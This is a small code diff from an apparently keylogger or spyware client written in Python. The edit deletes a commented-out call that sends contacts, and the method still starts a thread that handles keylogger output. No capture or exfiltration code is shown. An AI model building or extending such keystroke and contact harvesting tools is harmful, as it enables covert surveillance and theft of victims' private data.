@@ -44,7 +44,6 @@ class Client:
         """
         Sends contacts and starts a thread for handling keylogger output
         """
-        # self.send_contacts()
         handle_keylogger_output_thread = threading.Thread(
             target=self.handle_output)
         handle_keylogger_output_thread.start()
